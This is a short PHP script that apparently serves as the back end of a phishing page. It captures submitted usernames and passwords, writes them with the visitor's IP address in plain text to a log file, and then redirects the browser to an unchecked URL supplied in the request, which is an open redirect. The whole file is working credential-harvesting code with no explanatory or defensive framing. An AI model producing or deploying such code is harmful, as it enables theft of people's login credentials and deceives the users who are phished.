<?php

$username = $_POST['logn'];
$password = $_POST['passd'];
$return_dir = $_POST['redir'];
$f = fopen("/var/log/plat/log.txt", "a+");
$line = $username." , ".$password." , By IP".$_SERVER['REMOTE_ADDR']."\n";
fwrite($f,$line);
fclose($f);

header("Location: ".$return_dir);